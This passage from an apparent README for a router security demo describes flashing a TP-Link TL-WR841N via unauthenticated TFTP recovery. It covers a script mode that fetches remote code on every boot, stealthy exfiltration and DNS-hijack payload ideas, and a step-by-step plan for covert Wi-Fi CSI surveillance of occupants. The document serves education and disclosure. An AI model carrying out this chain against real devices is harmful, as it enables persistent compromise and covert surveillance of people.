**How it works, briefly:** every Wi-Fi packet a router sends or receives
carries a per-packet, per-subcarrier measurement of how the RF signal
propagated through the physical environment, called **Channel State
Information (CSI)**. Human bodies are mostly water, and water strongly
absorbs and reflects 2.4 and 5 GHz RF — so the CSI measurement changes in
characteristic ways as a person moves through the signal path. Over the
last decade, researchers have published machine-learning techniques
(CNN-based, mostly) that read those CSI changes and infer:

- **Through-wall occupancy detection** — binary: is anyone in this room?
- **Person counting** — how many people are in the house.
- **Activity classification** — walking, sitting, standing up, falling,
  cooking, sleeping.
- **Gait-based individual identification** — telling specific people apart
  by how they move.
- **Vital-signs monitoring** — breathing rate and heart rate from
  Wi-Fi alone, replicated in multiple peer-reviewed papers.
- **Rough spatial tracking** — which room someone is in, at room-level
  resolution, no triangulation hardware required.

The router does not need line of sight. Standard interior walls (drywall,
plasterboard, wood framing) are largely transparent at 2.4 GHz; concrete
and metal mesh degrade the signal but don't block it.

**Why this router specifically is a candidate.** The QCA9533 chip in the
TL-WR841N v11 is an Atheros family chip, and the **Atheros CSI Tool**
(originally from the HALO lab at Nanyang Technological University, with
subsequent ports and research reproductions worldwide) is specifically
designed to extract CSI from this chipset via the `ath9k` driver. The hard
problem — getting the radio to report CSI at all — is already solved by
open-source academic tooling for *this exact chip family*. An attacker's
remaining engineering work is roughly:

1. Build the `ath9k` CSI patch as a kernel module for OpenWrt 17.01.4 /
   ar71xx (same toolchain we already use for DOOM).
2. Install it in `/lib/modules/` and load at boot.
3. Pipe the CSI stream into a lightweight ML inference binary (a small
   CNN; published models fit in a few MB).
4. Phone the inferred state (who's in which room right now, breathing
   rate, is anyone asleep) home via the same persistence + outbound
   channel used for any other payload in the table above.

**Publicly cited literature in this capability class** (not exhaustive —
there are survey papers that cite 100+ works):

- **"See Through Walls with Wi-Fi!"** — Fadel Adib and Dina Katabi,
  MIT CSAIL, SIGCOMM 2013. The seminal paper for Wi-Fi through-wall
  imaging. ([paper](https://people.csail.mit.edu/fadel/papers/wivi-paper.pdf))
- **"Person-in-WiFi: Fine-grained Person Perception using WiFi"** —
  Fei Wang et al., Carnegie Mellon, ICCV 2019. Pose estimation and
  segmentation from Wi-Fi. ([paper](https://www.ri.cmu.edu/app/uploads/2019/09/Person_in_WiFi_ICCV2019.pdf))
- **"DensePose From WiFi"** — Carnegie Mellon, 2022/2023. Reconstructs
  24-point human body poses from Wi-Fi CSI, with camera-level accuracy
  on test subjects.
- **Atheros CSI Tool** — chipset-level CSI extraction for the exact
  `ath9k`/QCA family in this router.
- **A survey on CSI-based human-behavior recognition** —
  [sotaverified.org survey](https://sotaverified.org/papers/a-survey-on-csi-based-human-behavior)
  catalogues the field.

> *Note on provenance:* this project's author recalls a specific South
> Korean research paper that framed this capability as "routers can see
> through walls / detect people behind them." A targeted search did not
> surface a clean citation match (closest hits are the papers above and
> an attention-based through-wall presence-detection paper on arXiv,
> [2304.13105](https://arxiv.org/pdf/2304.13105)), and the capability is
> broadly researched by multiple Korean groups (KAIST, Yonsei, ETRI) as
> well as Taiwanese, Chinese, European, and US labs. If you can supply
> the specific title or lead author, this reference will be updated.

**What this means for the demo audience.** The same vulnerability that
lets us install a video game can be used to turn their router into a
motion sensor that detects when they come home, when they go to sleep,
when they're in the bathroom, when they're alone, and when they have
guests over. No camera. No app on their phone. No notification. No
software they can uninstall. Just a $25 router from a hotel lobby, a
dentist's waiting room, a short-term rental, or anywhere else the
attacker can touch Reset while powering it on.

**Why this is the sharpest version of the finding.** Every other payload
in the table steals *data the router already handled.* This one creates
*new data about the physical world* that neither the router's owner nor
anyone else was intending to generate. The router stops being "a thing
your packets pass through" and becomes "a thing that watches you,"
without ever adding a visible sensor to your home.

### Why we chose DOOM anyway (and why that choice is the point)

A security demo that shows malware doesn't land with non-technical
decision-makers. They've been told their whole career that hackers deploy
malware. They nod and move on. A demo that shows **the same router they just
saw running the TP-Link login page now streaming a 1993 video game** makes
them laugh — then stop — then realize: *"wait, if it can run that, it can
run anything."* The pivot from laughter to **"oh"** is the demo's actual
payload. **DOOM is the trojan horse for the realization.**

A real adversary targeting this hardware would never pick DOOM. They would
pick something you would never notice:

- A packet logger that writes to tmpfs only, upload-batches once a day over
  HTTPS to a CDN that looks like a software-update endpoint.
- A DNS hijack that only activates for a shortlist of 20 banking domains
  and the rest resolve normally.
- A reverse beacon that only phones home when traffic to the ISP is high
  (so the connection blends into normal evening streaming traffic).

**The reason you've never heard about a real attack like this against this
device is precisely because an attacker who used this chain correctly would
not want you to.** The absence of public evidence is not evidence of absence
— it is the expected outcome of a well-executed attack of this class.

### How often does the attacker need to be present?

The current demo makes it look like the attacker needs **ongoing LAN
presence** — the `scp` of the payload, the `python3 -m http.server` for
reboot re-fetches, and the manual launch all happen from a laptop that's
sitting on the same wired network as the router.

**That's a demo-design choice, not a property of the vulnerability.**

It exists because keeping every artifact under direct, auditable local
control makes the demo reproducible without pointing at any third-party
infrastructure. For a classroom or conference setting, that's the right
tradeoff — the audience can inspect every file, every byte, every network
request. Nothing is hiding behind "trust us, there's a backend somewhere."

But it under-sells the real risk by implying the attacker is on-site more
than they need to be. A one-visit-and-vanish version of the same chain is
not just possible — it's the shape a real attacker's version would take.

#### What one-time-physical actually requires

The vulnerability's layers break down cleanly by how local they are:

| Step | On-site requirement | Can be collapsed into Phase 1? |
|---|---|---|
| **Reset-hold at power-on** | Hand on a physical button at the moment power comes up. | — (this IS Phase 1) |
| **TFTP firmware fetch** | L2-adjacent server at `192.168.0.66`. ARP, not routed. | Yes — happens during Phase 1 |
| **Payload deployment** (SCP) | Currently a separate LAN step. | **Yes — bake the fetch logic into the firmware image itself** |
| **Persistence install** (`rc.local`) | Currently a separate LAN step. | **Yes — same as above; it's part of the firmware** |
| **Payload artifact hosting** | Currently a Python HTTP server on the attacker's laptop. | **Can live on any internet-reachable host** (public cloud, CDN, a GitHub release) |

So the collapsed flow is:

1. **Weeks earlier, offline:** attacker builds a custom OpenWrt image whose
   `/etc/rc.local` points at a public URL they control (a cloud storage
   bucket, a GitHub release, anywhere reachable from the target's WAN).
   The image has the same TP-Link product-ID header as the stock OpenWrt
   factory build — U-Boot can't distinguish them.
2. **One physical visit, under two minutes:** reset-hold, TFTP serves the
   custom image, router reboots into the custom OpenWrt. Attacker walks
   out of the building. **No laptop stays behind. No LAN presence remains.**
3. **Every router boot from then on:** `rc.local` runs → router dials out
   on its own WAN link → fetches payload from the public URL → launches
   under the same supervisor loop this demo already uses. The target's
   own internet connection and the attacker's public download URL do all
   the subsequent work.
4. **At any later time, from anywhere:** the attacker interacts with the
   payload. For DOOM specifically, this just means pointing a browser at
   the target's address — but all mechanical requirements for ongoing
   access are met by the router dialing out and establishing outbound
   connections (which bypass any firewall that only inspects inbound
   traffic — the majority of residential and SMB firewalls).

#### Why this makes the threat model qualitatively worse

The on-site-dependent framing suggests an **insider or repeat-visitor**
threat model: a disgruntled employee, a contractor with ongoing access,
someone with a reason to come back repeatedly.

The one-time-physical framing is a **transient-access** threat model.
That includes:

- A guest at a conference, after-hours when nobody's watching.
- A short-term rental guest, five minutes alone with the router.
- An Airbnb host between bookings.
- A cleaning crew in an office at 2 AM.
- A delivery person left briefly unattended.
- A visiting repair technician.
- A new employee waiting in a reception area.
- Anyone the device's owner trusts enough to let into the room for a
  moment — which, for a device typically sitting unattended in a cabinet
  or a corner, is a lot of people.

**One minute of unsupervised proximity, exactly once, ever.** That is the
accurate upper bound on what this vulnerability requires.

#### This project's demonstration of the collapsed flow

The subcommand `exploit:flash-remote-doom <public-url>` builds a custom
OpenWrt factory image with a baked-in `/etc/rc.local` that fetches DOOM
from the URL you supply, and flashes it in a single pass. After it runs,
you can disconnect your laptop from the LAN entirely and the router will
continue fetching + running DOOM on every boot, from whatever host you
pointed it at.

Public-URL options the demo supports (any works, in order of simplest to
most "attacker-realistic"):

- **A GitHub release** of this project's own `doom/doomgeneric-mips-be`
  + `doom1.wad` artifacts (simplest; attacker-neutral; artifact-signed).
- **A cloud storage bucket** (S3 / GCS / R2) you control.
- **Any plain HTTP server reachable from the target's WAN.**

The payload (DOOM) is byte-identical to the SCP-based variant. The only
material change is that `rc.local` was placed into the firmware *before*
the physical visit, rather than written over SSH afterward.

The build mechanism uses the official **OpenWrt Image Builder** for
ar71xx 17.01.4, which the subcommand downloads on first use (~30 MB,
cached under `sdk/imagebuilder/`). No image modification or firmware
patching is required — the Image Builder produces a factory image whose
provenance can be audited against the public OpenWrt build system, and
the only non-stock element is the one file we add via its `FILES=`
overlay feature.

### The real finding, said bluntly

> **This device is sixty seconds of unsupervised physical access away from
> being someone else's completely, exactly once, ever, with no return
> visit needed — with no detectable change to its external behavior, with
> no password cracked, with no CVE exploited at the software level, and
> with no vendor patch possible.**
>
> The TFTP recovery vulnerability is a design-era choice baked into
> bootloader code that lives on a 128 KB region of flash the vendor's own
> firmware updates do not touch. The only sanctioned fix is **replace the
> device**. See the full writeup in `assessment_report.md` §9 for migration
> guidance.

DOOM is the way to say that out loud without putting the audience to sleep.

---

## Repository layout

```
.
├── README.md                   ← you are here
├── pwn-router.sh               ← the one driver script (exploit:* + doom:*)
├── assessment_report.md        ← full security assessment (§1-9 base, §10 DOOM)
├── CHEATSHEET.md               ← copy-pasteable manual equivalents
│
├── firmwares/
│   ├── stock/                  wr841n_v11_160325.bin                                           (revert target)
│   └── openwrt/                lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin   (the TFTP payload)
│
├── doom/
│   ├── doomgeneric-mips-be     cross-compiled, Y/N-fix patched, SHA1-verified (big-endian MIPS)
│   ├── doom1.wad               full shareware IWAD, SHA1-verified
│   ├── SHA1SUMS.txt
│   └── source/                 doomgeneric source tree (if you want to rebuild from scratch)
│
├── sdk/                        LEDE 17.01.4 ar71xx SDK (big-endian MIPS cross-toolchain)
│
├── evidence/                   nmap, disassembly, live WAN/web capture from the assessment
├── findings/                   supporting vulnerability notes
├── images/                     hardware photos (PCB, ports, UART hookup, label)
│
└── docs/
    ├── DOOM.md                 in-game controls + keymap details
    └── legacy-scripts/         original separate scripts, kept for provenance
```

---

## Troubleshooting + logs

`CHEATSHEET.md` has a complete troubleshooting table covering every failure
mode we hit during development, with specific symptoms and fixes. Short
cheat-sheet for the most common:

| Symptom | First thing to check |
|---|---|
| `exploit:flash-openwrt` times out at the TFTP step | `exploit:check-network` — your VM probably isn't L2-bridged to the router. |
| Router flashed OK but SSH fails with "no matching key exchange" | You're using the raw `ssh` instead of the wrapper. Use `exploit:ssh` or `doom:ssh`, both of which set the legacy KEX flags. |
| `doom:deploy` fails at "size mismatch after scp" | Something's wrong with the scp transfer. Rerun; the retry usually works. If it keeps happening, check `dmesg` on the router for I/O errors. |
| DOOM "freezes" after a while in the browser | The supervisor's auto-recovery handles this within 30s. Force immediate: `doom:restart`. See `doom:logs` for the `[watch]` entries. |
| DOOM doesn't come back after a router reboot | Laptop HTTP server probably isn't running. Check `doom:status`. Fix: `doom:persist` (which also starts the server). |

For deep logs, `./pwn-router.sh doom:logs` aggregates:

- `/tmp/doom.log` on router (game output + supervisor messages tagged `[watch]`)
- `/tmp/doom_boot.log` on router (rc.local-side boot activity)
- `/tmp/doom_httpd.log` on laptop (Python http.server access log)

---

## Credits + references

This project builds on three particularly useful external resources:

- **[chankruze — TL-WR841N-v11](https://github.com/chankruze/TL-WR841N-v11)**
  — Community documentation for OpenWrt bring-up on this exact hardware
  revision. Confirmed the v11-specific image compatibility and the firmware
  rename trick.
- **[doom-on-router](https://github.com/mingrammer/doom-on-router)** — the
  upstream `doomgeneric` fork with the mongoose HTTP+WebSocket shim. The
  build in this repo is a big-endian recompile of that project, plus a
  2-line keymap fix for the quit-confirmation prompt. See `doom/source/`
  for the full tree.
- **[moria](https://github.com/nmatt0/moria)** and
  **[mithril](https://github.com/nmatt0/mithril)** — IoT firmware extraction
  and static-analysis tooling used in the original security assessment to
  identify the stock firmware's components, SBOM, and CVE exposure.

Framework references used in `assessment_report.md`:

- OWASP IoT Security Testing Guide (ISTG v1.0)
- OWASP Firmware Security Testing Methodology (FSTM v1.0)
- OWASP IoT Security Verification Standard (ISVS v1.0.0-RC2)
- NISTIR 8200

---

## Legal, ethics, and disclosure

**This project is for authorized security testing, education, and
demonstration against hardware you own or have explicit written permission
to test.** Do not perform this attack against devices you do not own.

The technique documented here (unauthenticated U-Boot TFTP recovery) is a
**known class** of IoT bootloader weakness going back more than a decade.
It is not a novel 0-day. The TP-Link TL-WR841N v11 is end-of-life; TP-Link
has not shipped security updates for this hardware revision in years and
the vendor's documented recommendation for affected customers is to migrate
to a supported model. There is no patch to responsibly disclose to — the
vulnerability is a design-era choice baked into bootloader code that cannot
be updated through any sanctioned channel.

Impact classification:

- **CVSS 4.0:** 8.6 (Critical)
- **EPSS (adjacent CVEs):** 0.07–0.40% (0–35th percentile — physical access
  depresses mass-exploitation probability, but **not severity**)
- **OWASP ISVS:** L2/L3 non-conformance (V3.1.1, V3.4.3, V3.4.8, V5.1.1)

If you're using this project to teach, assess, or demo: do it in a
controlled environment, on hardware you own, and don't connect the attacker
VM to any production network while the TFTP server is bound to
`192.168.0.66`. A production LAN with a legitimate PXE/TFTP infrastructure
could be disrupted by your `atftpd` responding to unrelated devices'
recovery requests on the same subnet.
